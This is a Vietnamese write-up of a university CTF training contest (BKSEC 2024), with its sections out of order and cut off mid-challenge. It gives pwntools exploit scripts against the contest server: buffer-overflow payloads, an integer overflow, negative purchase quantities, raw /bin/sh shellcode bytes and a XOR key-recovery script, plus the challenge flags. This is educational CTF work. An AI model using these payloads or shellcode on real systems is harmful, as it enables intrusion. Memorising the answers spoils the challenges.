+<p>Load file vào IDA, yêu cầu bài này chỉ là viết shellcode đơn giản</p>
+
+<p><img src="/images/bktrain2024/image-6.png" alt="alt text" /></p>
+
+<p><strong>Lời giải</strong></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">./shell_1</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6071</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05</span><span class="sh">'</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">(max 256 bytes):</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p><strong>Đáp án: BKSEC{ju$7_A_5imPLE_ShelLCODE}</strong></p>
+<h2 id="crypto">
+  
+  
+    Crypto <a href="#crypto">#</a>
+  
+  
+</h2>
+    
+<h3 id="bài-b64-recovery">
+  
+  
+    Bài B64 Recovery <a href="#bài-b64-recovery">#</a>
+  
+  
+</h3>
+    
+
+<p>Đề bài cho chúng ta source code như sau</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">base64</span>
+<span class="kn">import</span> <span class="n">random</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="sh">'</span><span class="s">BKSEC{still secret}</span><span class="sh">'</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">flag</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">decode</span><span class="p">()</span>
+<span class="n">key</span> <span class="o">=</span> <span class="sh">""</span> <span class="c1">#guess it if u can
+</span><span class="n">encode</span> <span class="o">=</span> <span class="sh">""</span>
+<span class="n">pivot</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">i</span> <span class="o">=</span> <span class="n">pivot</span>
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
+    <span class="n">encode</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">^</span><span class="nf">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
+    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="n">i</span> <span class="o">%=</span> <span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+<span class="n">output</span> <span class="o">=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span> <span class="o">+</span> <span class="nf">chr</span><span class="p">(</span><span class="n">pivot</span><span class="p">)</span> <span class="o">+</span> <span class="n">encode</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Từ <code class="language-plaintext highlighter-rouge">output</code>, chúng ta có thể biết một số thông tin như sau</p>
+<ul>
+  <li>Độ dài <code class="language-plaintext highlighter-rouge">flag</code> sau khi encode base64 là 68</li>
+  <li>Giá trị ngẫu nhiên <code class="language-plaintext highlighter-rouge">pivot</code></li>
+  <li>Đoạn mã encoded</li>
+</ul>
+
+<p>Lưu ý: <code class="language-plaintext highlighter-rouge">flag</code> mà chúng ta nhắc tới ở đây là sau khi đã bị mã hóa base64, không phải flag ban đầu.</p>
+
+<p>Thuật toán bài toán này rất đơn giản, đem xor giá trị của <code class="language-plaintext highlighter-rouge">flag[i]</code> với <code class="language-plaintext highlighter-rouge">key[pivot % len(key)]</code>.</p>
+
+<p>Nhờ việc connect server liên tục, ta có thể đoán được <code class="language-plaintext highlighter-rouge">len(key) = 50</code></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># brute-force to find len of key
+</span><span class="n">x</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100000</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+
+    <span class="n">lenflag</span> <span class="o">=</span> <span class="mi">68</span> 
+    <span class="n">pivot</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">x</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
+
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">pivot </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
+
+<span class="n">x</span><span class="p">.</span><span class="nf">sort</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Kế tiếp, ta đã biết được <strong>flag gốc</strong> bắt đầu bằng cụm từ <strong>BKSEC{</strong>. Thử một số phép thử với mã hóa base64, ta nhận thấy flag sau khi encode luôn bắt đầu bằng <strong>QktTRUN7</strong>.</p>
+
+<p>Do ta đã biết đoạn <code class="language-plaintext highlighter-rouge">encoded</code>, kết hợp thuật toán nêu trên. Ta có thể tìm lại được <code class="language-plaintext highlighter-rouge">key</code> bằng cách cho connet server liên tục để khôi phục.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># brute-force to find key
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+    <span class="n">encoded</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">::].</span><span class="nf">strip</span><span class="p">()</span>
+    <span class="n">pivot</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">key</span><span class="p">[(</span><span class="n">pivot</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">%</span> <span class="mi">50</span><span class="p">]</span> <span class="o">=</span> <span class="n">encode</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">^</span> <span class="nf">ord</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">j</span><span class="p">])</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+    
+    <span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Từ đây, ta có được <code class="language-plaintext highlighter-rouge">key</code> và việc giải bài toán còn lại là hoàn toàn dễ dàng</p>
+
+<p><strong>Lời giải</strong></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="n">base64</span>
+
+<span class="c1"># brute-force to find len of key
+</span><span class="n">x</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100000</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+
+    <span class="n">lenflag</span> <span class="o">=</span> <span class="mi">68</span> 
+    <span class="n">pivot</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">x</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
+
+    <span class="c1"># print(data)
+</span>    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">pivot </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
+    <span class="c1"># p.close()
+</span>
+<span class="n">x</span><span class="p">.</span><span class="nf">sort</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+
+<span class="n">lenflag</span> <span class="o">=</span> <span class="mi">68</span>
+<span class="n">lenkey</span> <span class="o">=</span> <span class="mi">50</span> 
+<span class="n">flag</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">Q</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">k</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">t</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">T</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">R</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">U</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">N</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">7</span><span class="sh">'</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="sh">''</span><span class="p">]</span> <span class="o">*</span> <span class="mi">60</span>
+<span class="n">key</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">50</span>
+
+<span class="c1"># brute-force to find key
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+    <span class="n">encoded</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">::].</span><span class="nf">strip</span><span class="p">()</span>
+    <span class="n">pivot</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">key</span><span class="p">[(</span><span class="n">pivot</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">%</span> <span class="mi">50</span><span class="p">]</span> <span class="o">=</span> <span class="n">encode</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">^</span> <span class="nf">ord</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">j</span><span class="p">])</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+    
+    <span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="p">[</span><span class="mi">73</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">46</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="mi">33</span><span class="p">]</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+<span class="n">encoded</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">::].</span><span class="nf">strip</span><span class="p">()</span>
+<span class="n">pivot</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">decoded</span> <span class="o">=</span> <span class="sh">''</span>
+
+<span class="n">i</span> <span class="o">=</span> <span class="n">pivot</span>
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">encoded</span><span class="p">:</span>
+    <span class="n">decoded</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">50</span><span class="p">])</span>
+    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="n">i</span> <span class="o">%=</span> <span class="mi">50</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">decoded</span><span class="p">))</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><strong>Đáp án: BKSEC{W0vv_1_d0nt_th1nk_y0u_c4n_r3c0v3r_my_m3554g3}</strong></p>
+    <!-- <h2 id="table-of-content">Table of Content</h2>
+<ul>
+  <li><a href="#lời-chào">0x00 Lời chào</a></li>
+  <li><a href="#pwnable">0x01 Pwnable</a>
+    <ul>
+      <li><a href="#bài-buffalow">Buffalow</a></li>
+      <li><a href="#bài-index_1">index_1</a></li>
+      <li><a href="#bài-int_1">int_1</a></li>
+      <li><a href="#bài-rộp-rộp-rộp">Rộp Rộp Rộp</a></li>
+      <li><a href="#bài-pwn3">pwn3</a></li>
+      <li><a href="#bài-raising-the-hero">Raising the hero</a></li>
+      <li><a href="#bài-shell_1">shell_1</a></li>
+    </ul>
+  </li>
+  <li><a href="#crypto">0x02 Crypto</a>
+    <ul>
+      <li><a href="#bài-b64-recovery">B64 Recovery</a></li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="lời-chào">Lời chào</h2>
+
+<p style="text-align: center;"><img src="/images/bktrain2024/imagee.png" alt="Smile" /></p>
+
+<p>Đã từ lâu, tôi không viết bài ctf mới trên blog, một phần vì chưa có chủ đề nào tôi cảm thấy thú vị để viết, phần còn lại là do quỹ thời gian của tôi gần đây không có nhiều. Khởi động năm mới 2024 với giải training của trường ĐHBKHN, độ khó của các bài chỉ ở tầm dễ, trung bình, vì vậy tôi cũng tự tin hơn.</p>
+
+<h2 id="pwnable">Pwnable</h2>
+
+<h3 id="bài-buffalow">Bài Buffalow</h3>
+
+<p>Đề bài cho chúng ta source code, đây là một bài BOF cơ bản</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">flag</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">50</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Enter your favorite number: "</span><span class="p">);</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">flag</span> <span class="o">==</span> <span class="mh">0x13141516</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
+        <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+        <span class="n">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">flag</span><span class="p">),</span> <span class="n">fp</span><span class="p">);</span>   
+        <span class="n">puts</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Hỗ hổng nằm ở hàm <code class="language-plaintext highlighter-rouge">fgets</code> với việc cho nhập 100 bytes vào mảng <code class="language-plaintext highlighter-rouge">buf</code> có kích thước 50 bytes. Vì vậy, chúng ta có thể thay đổi giá trị biến <code class="language-plaintext highlighter-rouge">flag</code> từ 0xDEADBEEF thành 0x13141516 dựa vào lỗ hổng này.</p>
+
+<p>Quan sát trong IDA, chúng ta dễ dàng tính ra được số bytes cần phải lấp đầy mảng <code class="language-plaintext highlighter-rouge">buf</code> được khi ghi đè giá trị biến <code class="language-plaintext highlighter-rouge">flag</code> là 0x50-0x4 = 76 (bytes)</p>
+
+<p><img src="/images/bktrain2024/image.png" alt="alt text" /></p>
+
+<p><strong>Lời giải</strong></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./bof_1</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6001</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="o">*</span><span class="mi">76</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x13141516</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">number: </span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><strong>Đáp án: BKSEC{\xBuffer\xOv3rfl0w\x1s\xchiLL}</strong></p>
+
+<h3 id="bài-index_1">Bài index_1</h3>
+
+<p>Đây là một chương trình mua bán các vật phẩm. Với dạng bài này, các lỗ hổng như chuyển tiền âm, mua số lượng sản phẩm âm, … rất dễ xảy ra nếu không được kiểm tra kỹ càng.</p>
+
+<p>Load file vào IDA, sau khi phân tích một chút, chúng ta cần quan tâm tới 2 đoạn mã sau đây</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">6</span> <span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">money</span> <span class="o">&gt;</span> <span class="mh">0x64</span> <span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+<span class="nl">LABEL_x409:</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Insufficient funds. You cannot afford this item."</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Với số tiền ban đầu là <code class="language-plaintext highlighter-rouge">money = 0x64</code>, chúng ta sẽ có được shell nếu như số tiền <code class="language-plaintext highlighter-rouge">money &gt; 0x64</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span> <span class="n">option</span> <span class="o">&lt;=</span> <span class="mi">6</span> <span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">price</span> <span class="o">=</span> <span class="n">HIDWORD</span><span class="p">(</span><span class="n">v9</span><span class="p">[</span><span class="mi">7</span> <span class="o">*</span> <span class="n">option</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]);</span>
+    <span class="n">total</span> <span class="o">=</span> <span class="n">price</span> <span class="o">*</span> <span class="n">num</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">price</span> <span class="o">*</span> <span class="n">num</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">money</span> <span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">goto</span> <span class="n">LABEL_x409</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">money</span> <span class="o">-=</span> <span class="n">total</span><span class="p">;</span>
+    <span class="p">[...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Với đoạn code này, khi mua vật phẩm, số tiền chúng ta sẽ bị trừ đi. Ở đây không có kiểm tra số lượng vật phẩm mua, vì vậy chúng ta sẽ mua số vật phẩm &lt; 0.</p>
+
+<p><img src="/images/bktrain2024/image-1.png" alt="alt text" /></p>
+
+<p><strong>Đáp án: BKSEC{YOU_SHOULD_buY_f1A9_iN5TE4d_0F_p@PC@i1}</strong></p>
+
+<h3 id="bài-int_1">Bài int_1</h3>
+
+<p>Load file vào IDA, ta thấy chương trình cho nhập 2 số nguyên dương. Nếu tổng của chúng &lt; 0, ta sẽ có được shell. Đây là lỗ hổng IOF (tràn số nguyên), ta chỉ cần nhập max giá trị của kiểu dữ liệu int cho số đầu tiên và số còn lại với giá trị nguyên dương bất kỳ.</p>
+
+<p><img src="/images/bktrain2024/image-7.png" alt="alt text" /></p>
+
+<p><strong>Lời giải</strong></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3 
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6051</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">number: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">2147483647</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">number: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">10</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><strong>Đáp án: BKSEC{Ma7h_1s_7hE_woR57_thIn6_EveR}</strong></p>
+
+<h3 id="bài-rộp-rộp-rộp">Bài Rộp Rộp Rộp</h3>
+
+<p>Load file đã cho vào IDA, ta thấy được lỗ hổng ở hàm <code class="language-plaintext highlighter-rouge">fgets()</code> với việc cho phép nhập 0x100 bytes cho mảng <code class="language-plaintext highlighter-rouge">buf</code> có kích thước 8 bytes. (Ở đây tôi không chắc <code class="language-plaintext highlighter-rouge">buf</code> có kích thước 8 bytes vì IDA phân tích ra như vậy. Nhưng tôi chắc chắn có lỗi BOF do <code class="language-plaintext highlighter-rouge">buf</code> được bắt đầu từ [rbp-0x40])</p>
+
+<p><img src="/images/bktrain2024/image-3.png" alt="alt text" /></p>
+
+<p>Quay lại bài toán, đây là dạng bài <code class="language-plaintext highlighter-rouge">ret2win</code> với hàm <code class="language-plaintext highlighter-rouge">win()</code> được thiết kế như sau</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">win</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a2</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">a1</span> <span class="o">!=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xDEADBEEFDEADBEEFLL</span> <span class="o">||</span> <span class="n">a2</span> <span class="o">!=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xDEADBEEFDEADBEEFLL</span> <span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"!!! Access denied"</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Entered param1: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a1</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Entered param2: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a2</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
